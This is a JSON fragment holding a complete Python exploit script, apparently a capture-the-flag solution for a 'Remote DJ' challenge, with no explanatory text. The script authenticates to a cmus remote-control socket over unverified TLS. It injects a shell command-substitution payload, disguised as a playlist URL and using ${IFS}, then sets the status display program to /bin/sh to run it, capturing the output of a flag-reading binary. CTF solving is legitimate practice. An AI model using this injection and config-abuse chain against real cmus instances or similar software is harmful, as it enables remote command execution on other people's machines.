        "code": "\n#!/usr/bin/env python3\nimport re\nimport socket\nimport ssl\nimport time\n\nHOST = \"8364547b5506d5b6.remote-dj.flu.xxx\"\nPORT = 443\nPASSWORD = \"correct-horse-battery-staple\"\n\nOUTFILE = \"/home/ctf/flag.m3u\"\n\nPAYLOAD = (\n    \"http://127.0.0.1/;\"\n    \"echo${IFS}http://flag/\"\n    \"$(/readflag${IFS}please${IFS}give${IFS}me${IFS}the${IFS}flag)\"\n    f\">{OUTFILE}\"\n)\n\n\nclass CmusClient:\n    def __init__(self):\n        raw = socket.create_connection((HOST, PORT), timeout=5)\n        raw.settimeout(5)\n\n        ctx = ssl._create_unverified_context()\n        self.sock = ctx.wrap_socket(raw, server_hostname=HOST)\n        self.buf = bytearray()\n\n    def command(self, cmd, output=False):\n        print(f\">> {cmd}\")\n        self.sock.sendall((cmd + \"\\n\").encode())\n\n        terminator = b\"\\n\\n\" if output else b\"\\n\"\n\n        while terminator not in self.buf:\n            data = self.sock.recv(8192)\n            if not data:\n                raise ConnectionError(\"Connection closed\")\n            self.buf.extend(data)\n\n        pos = self.buf.index(terminator) + len(terminator)\n        result = bytes(self.buf[:pos]).decode(errors=\"replace\")\n        del self.buf[:pos]\n\n        if output:\n            print(\"<<\", result.strip())\n\n        return result\n\n    def close(self):\n        self.sock.close()\n\n\ndef main():\n    print(\"[*] Connecting to Remote DJ\")\n\n    c = CmusClient()\n\n    try:\n        c.command(f\"passwd {PASSWORD}\")\n        print(\"[+] Authentication sent\")\n\n        c.command(\"set skip_track_info=true\")\n        c.command(\"view 3\")\n        c.command(\"add -p \" + PAYLOAD)\n\n        print(\"[*] Checking playlist payload\")\n\n        found = False\n\n        for _ in range(14):\n            time.sleep(0.2)\n            playlist = c.command(\"save -p -\", output=True)\n\n            if PAYLOAD in playlist:\n                found = True\n                break\n\n        if not found:\n            print(\"[-] Payload not found in playlist\")\n            return\n\n        print(\"[+] Payload inserted\")\n\n        c.command(\"pl-export status\")\n        c.command(\"set status_display_program=/bin/sh\")\n\n        print(\"[*] Triggering status program\")\n\n        c.command(\"player-play\")\n        time.sleep(0.45)\n        c.command(\"player-stop\")\n        time.sleep(0.65)\n\n        print(\"[*] Loading generated flag playlist\")\n\n        c.command(f\"load -l {OUTFILE}\")\n\n        for _ in range(20):\n            time.sleep(0.2)\n\n            listing = c.command(\"save -l -\", output=True)\n\n            matches = re.findall(\n                r\"^http://flag/(.+)$\",\n                listing,\n                re.MULTILINE\n            )\n\n            if matches:\n                flag = matches[0].strip()\n                print(f\"\\n<FLAG>{flag}</FLAG>\")\n                return\n\n        print(\"[-] Flag not found; inspect output\")\n\n    finally:\n        c.close()\n\n\nif __name__ == \"__main__\":\n    main()\n"
